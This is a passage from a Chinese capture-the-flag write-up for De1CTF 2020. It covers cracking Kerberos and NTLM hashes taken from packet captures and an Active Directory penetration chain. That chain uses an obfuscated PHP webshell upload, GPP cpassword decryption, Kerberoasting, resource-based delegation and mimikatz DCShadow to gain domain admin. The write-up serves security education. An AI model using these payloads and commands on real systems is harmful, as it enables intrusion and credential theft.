preauthentication</code>那么就可以通过<code>AS-REPRoasting</code>去暴力破解这个用户的凭证。</p><p>还有一个判断方法是第一步发送AS-REQ请求的时候，AS-REP返回了一个<code>eRR-PROAUTH-REQUIRED</code>错误，不过这个方法不完全能判定是<code>AS-REPRoasting</code>，因为在默认情况下，<code>Windows Kerberos</code>客户端在第一个请求中不包括预身份验证信息，所以在正常认证中也会出现此情况。<code>eRR-PROAUTH-REQUIRED</code>只不过是进一步验证我们上面<code>AS-REPRoasting</code>的猜测</p><figure><img src="https://i.loli.net/2020/05/05/6jbiXVxd1gYsFMI.png" alt><figcaption>6.png</figcaption></figure><p>猜测是<code>AS-REPRoasting</code>过程之后，然后从AS-REP中把票据的<code>enc-part</code>部分提取出来</p><figure><img src="https://i.loli.net/2020/05/05/XzlLOxdZofhqIE2.png" alt><figcaption>7.png</figcaption></figure><p>构造成hashcat支持的的格式，<code>$krb5asrep$23$&lt;PRINCIPAL_NAME&gt;:&lt;FIRST_16_BYTES&gt;$&lt;REMAINING_BYTES&gt;</code></p><p>然后爆破即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -m 18200 $krb5asrep$23$De1CTF2020@test.local:2a00ca98642914e2cebb2718e79cbfb6$9026dd00f0b130fd4c4fd71a80817ddd5aec619a9b2e9b53ae2309bde0a9796ebcfa90558e8aaa6f39350b8f6de3a815a7b62ec0c154fe5e2802070146068dc9db1dc981fb355c94ead296cdaefc9c786ce589b43b25fb5b7ddad819db2edecd573342eaa029441ddfdb26765ce01ff719917ba3d0e7ce71a0fae38f91d17cf26d139b377ea2eb5114a2d36a5f27983e8c4cb599d9a4a5ae31a24db701d0734c79b1d323fcf0fe574e8dcca5347a6fb98b7fc2e63ccb125a48a44d4158de940b4fd0c74c7436198380c03170835d4934965ef6a25299e3f1af107c2154f40598db8600c855b2b183 ?d?d?d?d?d?d?d?d -a 3 --force</span><br></pre></td></tr></table></figure><p>得到part2:74212345</p><h3><span id="part3">part3</span></h3><p>一个NTLM认证的过程，将数据包中的<code>Net-NTLM v2 hash</code>提取出来爆破即可，有两种方法，第一种方法是将<code>WWW-Authenticate</code>头的内容提取出来，第二种方法是直接从数据包中提取<code>Net-NTLM v2 hash</code>的各个部分</p><p>这里以第一种方法为例，将<code>WWW-Authenticate</code>头的内容提取出来，写一个脚本转换为<code>Net-NTLM v2 hash</code>即可</p><p>参考这篇文章<a href="https://www.innovation.ch/personal/ronald/ntlm.html" target="_blank" rel="noopener">https://www.innovation.ch/personal/ronald/ntlm.html</a></p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">NTLM=<span class="string">"NTLM TlRMTVNTUAADAAAAGAAYAH4AAAAkASQBlgAAAAgACABYAAAAFAAUAGAAAAAKAAoAdAAAAAAAAAC6AQAABYKIogoAY0UAAAAPZ+qOBf/ZoMFgp+YUgxdqNVQARQBTAFQARABlADEAQwBUAEYAMgAwADIAMABXAEkATgAxADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtZkcwqDVhdD4EzWOqvx0EgEBAAAAAAAAEwy5ECMI1gHSKQvAwlYXqAAAAAACAAgAVABFAFMAVAABAAwARABNADIAMAAxADIABAAUAHQAZQBzAHQALgBsAG8AYwBhAGwAAwAiAGQAbQAyADAAMQAyAC4AdABlAHMAdAAuAGwAbwBjAGEAbAAFABQAdABlAHMAdAAuAGwAbwBjAGEAbAAHAAgAEwy5ECMI1gEGAAQAAgAAAAgAMAAwAAAAAAAAAAAAAAAAEAAA7Ko9RN3EZAJsRTIGgTqvoLkY8q1D1Jfvj7a+sggyWKQKABAAAAAAAAAAAAAAAAAAAAAAAAkAHgBIAFQAVABQAC8AdABlAHMAdAAuAGwAbwBjAGEAbAAAAAAAAAAAAA=="</span></span><br><span class="line">b64_challenge=<span class="string">"NTLM TlRMTVNTUAACAAAACAAIADgAAAAFgomiVohvkPy3Pe0AAAAAAAAAAIIAggBAAAAABgOAJQAAAA9UAEUAUwBUAAIACABUAEUAUwBUAAEADABEAE0AMgAwADEAMgAEABQAdABlAHMAdAAuAGwAbwBjAGEAbAADACIAZABtADIAMAAxADIALgB0AGUAcwB0AC4AbABvAGMAYQBsAAUAFAB0AGUAcwB0AC4AbABvAGMAYQBsAAcACAATDLkQIwjWAQAAAAA="</span></span><br><span class="line">challenge= b64_challenge[<span class="number">5</span>:].decode(<span class="string">"base64"</span>)[<span class="number">24</span>:<span class="number">24</span>+<span class="number">8</span>].encode(<span class="string">"hex"</span>)</span><br><span class="line">message = NTLM[<span class="number">5</span>:].decode(<span class="string">"base64"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msg2str</span><span class="params">(msg,start,uni=True)</span>:</span></span><br><span class="line">    len = ord(msg[start+<span class="number">1</span>])*<span class="number">256</span> + ord(msg[start])</span><br><span class="line">    offset = ord(msg[start+<span class="number">5</span>])*<span class="number">256</span> + ord(msg[start+<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">if</span> uni:</span><br><span class="line">        <span class="keyword">return</span> (msg[offset:offset+len]).replace(<span class="string">"\x00"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> msg[offset:offset+len]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user = msg2str(message,<span class="number">36</span>)</span><br><span class="line">domain = msg2str(message,<span class="number">28</span>)</span><br><span class="line">response = msg2str(message,<span class="number">20</span>,<span class="keyword">False</span>)</span><br><span class="line">NTProofStr = response[<span class="number">0</span>:<span class="number">16</span>].encode(<span class="string">"hex"</span>)</span><br><span class="line">blob = response[<span class="number">16</span>:].encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"&#123;user&#125;::&#123;domain&#125;:&#123;challenge&#125;:&#123;NTProofStr&#125;:&#123;blob&#125;"</span>.format(user=user,domain=domain,challenge=challenge,NTProofStr=NTProofStr,blob=blob))</span><br></pre></td></tr></table></figure><p>得到<code>Net-NTLM v2 hash</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">De1CTF2020::TEST:56886f90fcb73ded:b5991cc2a0d585d0f813358eaafc7412:0101000000000000130cb9102308d601d2290bc0c25617a80000000002000800540045005300540001000c0044004d0032003000310032000400140074006500730074002e006c006f00630061006c000300220064006d0032003000310032002e0074006500730074002e006c006f00630061006c000500140074006500730074002e006c006f00630061006c0007000800130cb9102308d60106000400020000000800300030000000000000000000000000100000ecaa3d44ddc464026c453206813aafa0b918f2ad43d497ef8fb6beb2083258a40a0010000000000000000000000000000000000009001e0048005400540050002f0074006500730074002e006c006f00630061006c000000000000000000</span><br></pre></td></tr></table></figure><p>然后hashcat爆破即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -m 5600 De1CTF2020::TEST:56886f90fcb73ded:b5991cc2a0d585d0f813358eaafc7412:0101000000000000130cb9102308d601d2290bc0c25617a80000000002000800540045005300540001000c0044004d0032003000310032000400140074006500730074002e006c006f00630061006c000300220064006d0032003000310032002e0074006500730074002e006c006f00630061006c000500140074006500730074002e006c006f00630061006c0007000800130cb9102308d60106000400020000000800300030000000000000000000000000100000ecaa3d44ddc464026c453206813aafa0b918f2ad43d497ef8fb6beb2083258a40a0010000000000000000000000000000000000009001e0048005400540050002f0074006500730074002e006c006f00630061006c000000000000000000 ?d?d?d?d?d?d?d?d -a 3 --force</span><br></pre></td></tr></table></figure><p>得到part为<code>74212345</code></p><p>所以最终flag为：De1CTF{79345612_15673223_74212345}，上面的3个部分都是有工具可以提取hash的，篇幅有限这里就不过多演示了。</p><h3><span id="end">END</span></h3><p>其实Part1和Part2也不一定说是攻击过程，正常域认证出现这样的数据包也是很正常不过的，所以我才在我在中间加上了LDAP的查询语句，是想要选手快速定位数据包。还有就是密码长度设置的也不是很长，我这边跑完3个部分用时不到<code>1分钟</code>，有的队拿超算来跑，还有老外拿矿机来跑，看来我这题是真有“价值”啊233333</p><h2><span id="hard_pentest">Hard_Pentest</span></h2><p>上传</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: 47.113.219.76</span><br><span class="line">Content-Length: 1918</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://47.113.219.76</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyE7meGVYt90amEfD</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Referer: http://47.113.219.76/</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryyE7meGVYt90amEfD</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php::$DATA&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">&lt;?=$_=[]?&gt;&lt;?=$_=@&quot;$_&quot;?&gt;&lt;?=$_=$_[&apos;!&apos;==&apos;@&apos;]?&gt;&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___ =$__?&gt;</span><br><span class="line">&lt;?=$____=$___?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$___.=$__.$___?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$___.=$__?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$___.=$__?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$___.=$__?&gt;</span><br><span class="line">&lt;?=$____=&apos;_&apos;?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$____.=$__?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$____.=$__?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$____.=$__?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$____.=$__?&gt;</span><br><span class="line">&lt;?=$_=$$____?&gt;</span><br><span class="line">&lt;?=$___($_[_])?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryyE7meGVYt90amEfD</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">submit</span><br><span class="line">------WebKitFormBoundaryyE7meGVYt90amEfD--</span><br></pre></td></tr></table></figure><p>得到webshell后，发现flag不在web服务器上，猜测应该是内网渗透，为了方便操作可以弹个<code>meterpreter</code>或者<code>beacon</code>回来。然后下一步就是内网渗透了，简单信息收集一下，发现域控共享文件夹Hint有一个压缩包<code>flag1_and_flag2hint.zip</code></p><figure><img src="https://i.loli.net/2020/05/05/VCn4FW2amxzYbpw.png" alt><figcaption>1.png</figcaption></figure><p>将其下载下来，发现压缩包需要密码，继续信息收集，发现有一个用户<code>HintZip_Pass</code>，猜测压缩密码应该是从这个用户下手。</p><figure><img src="https://i.loli.net/2020/05/05/vPFWmMsaQSrzNVn.png" alt><figcaption>2.png</figcaption></figure><p>然后收集<code>Zip_Password</code>用户的一些信息，发现这个用户是属于<code>Zip_Password</code>这个OU的，而不是常规的Users容器</p><figure><img src="https://i.loli.net/2020/05/05/C7cJ9afkQuGbM1m.png" alt><figcaption>3.png</figcaption></figure><p>发现这个OU有一个<code>gplink</code></p><figure><img src="https://i.loli.net/2020/05/05/F2w5M9LPtsrzfnu.png" alt><figcaption>4.png</figcaption></figure><p>然后对这个GPO进行信息收集，发现</p><figure><img src="https://i.loli.net/2020/05/05/bPR6IZ7mpBNk14Q.png" alt><figcaption>6.png</figcaption></figure><p>然后用<code>Get-GPPPassword.ps1</code>即可得到压缩包密码</p><figure><img src="https://i.loli.net/2020/05/05/KUwZt3nkrH8SgpR.png" alt><figcaption>5.png</figcaption></figure><p>或者写一个脚本将<code>cpassword</code>解密也可以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">key = <span class="string">"4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">cpassword = <span class="string">"uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08"</span></span><br><span class="line">cpassword += <span class="string">"="</span> * ((<span class="number">4</span> - len(cpassword) % <span class="number">4</span>) % <span class="number">4</span>)</span><br><span class="line">password = b64decode(cpassword)</span><br><span class="line">plain = AES.new(key, AES.MODE_CBC, <span class="string">"\x00"</span> * <span class="number">16</span>)</span><br><span class="line">plain = plain.decrypt(password)</span><br><span class="line"><span class="keyword">print</span> plain[:-ord(plain[<span class="number">-1</span>])].decode(<span class="string">'utf16'</span>)</span><br></pre></td></tr></table></figure><p>解压之后即可得到flag1，以及flag2的一些hint</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag1: De1CTF&#123;GpP_11Is_SoOOO_Ea3333y&#125;</span><br><span class="line"></span><br><span class="line">Get flag2 Hint:</span><br><span class="line">hint1: You need De1ta user to get flag2</span><br><span class="line">hint2: De1ta user&apos;s password length is 1-8, and the password is composed of [0-9a-f].</span><br><span class="line">hint3: Pay attention to the extended rights of De1ta user on the domain.</span><br><span class="line">hint4: flag2 in Domain Controller (C:\Users\Administrator\Desktop\flag.txt)</span><br><span class="line"></span><br><span class="line">PS: Please do not damage the environment after getting permission, thanks QAQ.</span><br></pre></td></tr></table></figure><p>根据Hint，需要用户De1ta才能得到flag2，然后对De1ta用户进行信息收集，发现web用户对De1ta用户的<code>servicePrincipalName</code>属性具有写权限</p><figure><img src="https://i.loli.net/2020/05/05/K8YJMgxf6SmNCbn.png" alt><figcaption>8.png</figcaption></figure><p>根据Hint2猜测应该是通过web用户给De1ta设置spn然后通过<code>Kerberoasting</code>去暴力破解De1ta用户的密码。</p><p>尝试给De1ta用户设置spn</p><figure><img src="https://i.loli.net/2020/05/05/bRzpTnIfJKluUkD.png" alt><figcaption>9.png</figcaption></figure><p>然后<code>Kerberoasting</code></p><figure><img src="https://i.loli.net/2020/05/05/zs1ewu7xq256Fbd.png" alt><figcaption>10.png</figcaption></figure><p>然后根据Hint2用hashcat离线爆破即可得到De1ta用户的密码</p><p>PS：这里也可以通过LDAP协议在线暴力破解，但是密码长度为<code>16^1 + 16^2 + 16^3 + 16^4 + 16^5 + 16^6 + 16^7 + 16^8 = 4581298448</code>，很显然在线暴力破解不现实。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 13100 $krb5tgs$23$*USER$DOMAIN$test/test*$64EC0B10760E27F6EF4811DA3478C56D$77696AF42F593CF24D6B62D3DFEEF4AF8451E912AEC808B81BB2A833059EF7B0E9B41695D572B73917814E2439581239D264F4EF8ED6FC4DBC8DF5EA7D1F5CAD0B3197BFC16798C8EF2546B6DE4504D0F1C007EEA3222E948A448D818BDC8E4C26BBE2FD5D321BB0E2B0C6985383D9BA2E83E6389B4043E6CD04F2715C3159B7374DB32B817B4B3B04537CFDACD6FF54911F076EED74F820AF85D17FF93081775828E70DCD4489819EB6C6D518CF0C10F498B9A96EAA9CA330E8CE81C02D795572991D8979E39A6C633E849FCBC2831943F067320E41BF4FB0A9B8EB2EEC4CDD91606BDA4DF32A8BB4869D2CD424D9A156943D20E91F08C6EFA65B7C7AFC41309BCDA965E95D81318E47044D9333012914BBF27B1A48FC55BF8494DD65F317CAFA22F42F290335161ACE544841C196EBC239EE99A7F31C215119421390FAD8F16AAC63A7F83066B4CC5FB6AB89C61691E9202B447A4E920AF42A641133753AD5CF51580FBBAE080EBBAF589A1DF1E9543288A18116A0E191261149E63B88874BA607B3E4517EF84F3BA9B18255B58B3FF2C8570DCABC12F4FC0DA49AE61A92E8AF3C0ECD746BFF591743EFBC438E15CC645ECA3BFD935649168367287DD4E8029FC4454FAE237E8048FA701F8901EC9B4B5372E6B85802AB8A26F233D583F79F49CBAC378838E3C05AB2C2065C35A6C5D8B0B92D7F438E80BF3A1D847DC174BB0D370EB09125D710243001A9D988E350B43D556AEE8F09053790AAAFC395292EE2FAD3B7A04EB330AB90D2EAE29D9D922F0BB65ED2FF05A9A73B09001F5AECE1BC7162DE480F5463C7B19932B50DFA0329CDF0F964EFC0647FB7319408B541587D6AF2730EC52243E7A7BAB096AFB1FA6E7A81A7148347B43394BC3E280062105C1A6859F278C829E3BBAC3FD4F545154657BC4E0F55AF439140B3B1D29EE4209B8F83E3E3DDC52A6C32E92EB2836F80AF972B54D029D8EC071BD12BDCA45DBDF555A64B16AEC90CC486159D07D53A9D9196E5A736F48350F5639F482B45E7BA3EC11A9B7CA4DD8BC6320058CA0D891F5B4B1BFE0243E8D9640380492B0BEFB9EC13B8A4B2DE4297C3DE84FDB2753693F5E9FFB46FC1F60748AF1A07DE60F7656DBEDB927E3DF35B1AE8588BA6450C8D7539F982385D1B8AC25B37638EF9414519F37773A353EBBAAF996DF17DDE3CBF64B9ACFBEF65E12773004BDF5B6B81CC8CF5D2B59C6A2AAA883B458676AD2800710FA3F017C2E53B353D4E2C6B0D92D57B79939D29FAA8049F6CF0782E2572ACE8E8FFDFE1A05AC277924D4826606F5C68369C15186910DAEC601CA691910DCE519D58EDC964D5844FE8B7B21F9F99C6891FAE7DC0D783EA78EF6393A92F273D98353718670BA167A9CC9809B03195EDA8323B7C887040CD37FF4A09 -1 0123456789abcdef --increment --increment-min 1 --increment-max 8 ?1?1?1?1?1?1?1?1</span><br></pre></td></tr></table></figure><figure><img src="https://i.loli.net/2020/05/05/1FcBuURiYK9NwVH.png" alt><figcaption>11.png</figcaption></figure><p>根据Hint3：注意De1ta在域上的拓展权限，然后对域的ACL进行信息收集</p><figure><img src="https://i.loli.net/2020/05/05/GFscQ52ryqzDbVH.png" alt><figcaption>12.png</figcaption></figure><p>发现De1ta用户在域上有<code>Add/Remove Replica In Domain</code>、<code>Replication Synchronization</code>、<code>Manage Replication Topology</code>权限，这很容易想到Dcshadow，但是单单三个权限还是不满足Dcshadow的条件的，还要对当前主机属性具有写权限以及对<code>CN=Sites,CN=Configuration,DC=De1CTF2020,DC=lab</code>容器具有<code>Create Child</code>和<code>Delete Chind</code>权限。然后再收集一波相关的ACL</p><p>发现De1ta用户对<code>CN=Sites,CN=Configuration,DC=De1CTF2020,DC=lab</code>容器具有<code>Create Child</code>和<code>Delete Chind</code>权限</p><figure><img src="https://i.loli.net/2020/05/05/dcwhRPqpyLxbTrQ.png" alt><figcaption>13.png</figcaption></figure><p>De1ta对当前主机DM属性具有写权限，刚好满足Dcshadow的所有权限</p><figure><img src="https://i.loli.net/2020/05/05/9QMeEHbmWZOT4CL.png" alt><figcaption>14.png</figcaption></figure><p>但是现在还有一个问题是，Dcshadow需要system权限去调用本地的RPC服务，上面说过De1ta对当前主机DM属性具有写权限，通过信息收集可以知道域控是<code>Windows Server 2012R2</code></p><figure><img src="https://i.loli.net/2020/05/05/tuUW5Tsv8akISbY.png" alt><figcaption>38.png</figcaption></figure><p>所以我们可以通过基于资源的约束委派对当前主机进行本地提权。</p><p>申请一张De1ta用户的TGT，并导入当前会话</p><figure><img src="https://i.loli.net/2020/05/05/3b6wdSU97xmQ8DK.png" alt><figcaption>27.png</figcaption></figure><p>然后新建一个主机用户evilsystem，并配置evilsystem到DM基于资源的约束委派</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">New-MachineAccount -MachineAccount evilsystem -Password $(<span class="built_in">ConvertTo-SecureString</span> <span class="string">"evil"</span> -AsPlainText -Force)</span><br><span class="line"></span><br><span class="line"><span class="variable">$SD</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="string">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1806179181-549835139-1294087714-1111)"</span></span><br><span class="line"><span class="variable">$SDBytes</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, <span class="number">0</span>)</span><br><span class="line">Get-DomainComputer DM| Set-DomainObject -Set @&#123;<span class="string">'msds-allowedtoactonbehalfofotheridentity'</span>=<span class="variable">$SDBytes</span>&#125; -Verbose</span><br></pre></td></tr></table></figure><figure><img src="https://i.loli.net/2020/05/05/b7iMdkjF6ElXpKe.png" alt><figcaption>img</figcaption></figure><p>配置完成后我们就可以通过s4u获得一个高权限的shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.\getst.exe -dc-ip 192.168.0.12 -spn cifs/dm -impersonate Administrator de1ctf2020.lab/evilsystem:evil</span><br><span class="line">$env:KRB5CCNAME=&quot;Administrator.ccache&quot;</span><br><span class="line">.\wmiexec.exe -no-pass -k dm shell.exe</span><br></pre></td></tr></table></figure><p>PS：如果是msf的shell的话会出现如下情况，出现这个问题的原因应该是命名管道导致编码出现问题。</p><figure><img src="https://i.loli.net/2020/05/05/S7ak14zgVlCu3dA.png" alt><figcaption>29.png</figcaption></figure><p>所以这里使用cs，或者直接把内网穿透出来也是可以的</p><figure><img src="https://i.loli.net/2020/05/05/rH5AzbohEUWfyqt.png" alt><figcaption>30.png</figcaption></figure><p>执行之后就即可得到一个高权限的shell了</p><figure><img src="https://i.loli.net/2020/05/05/tTIwNgMYdS2WCZK.png" alt><figcaption>img</figcaption></figure><p>然后就是利用Dcshadow修改用户的属性，这里可以是修改SID-History为域管的SID或者是修改primaryGroupID改为域管组的primaryGroupID(512)都是可以的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe  &quot;!+&quot; &quot;!processtoken&quot; &quot;lsadump::dcshadow /object:de1ta /attribute:primaryGroupID /value:512&quot;</span><br></pre></td></tr></table></figure><figure><img src="https://i.loli.net/2020/05/05/lvid7czZSfP3apE.png" alt><figcaption>32.png</figcaption></figure><p>然后使用用户De1ta进行推送，触发域控间数据的同步</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:de1ta /rc4:B03094996601324646AC223BF30D0D07 /domain:de1ctf2020.lab /ptt &amp;&amp; mimikatz.exe &quot;lsadump::dcshadow /push&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><figure><img src="https://i.loli.net/2020/05/05/IbnqfEOQMpAH2ho.png" alt><figcaption>36.png</figcaption></figure><p>推送之后查看一下是否加入域管组</p><figure><img src="https://i.loli.net/2020/05/05/YNK7qHQydiMglxB.png" alt><figcaption>35.png</figcaption></figure><p>然后读取在域控上的flag即可</p><figure><img src="https://i.loli.net/2020/05/05/vaGIPQfXKyEJl7r.png" 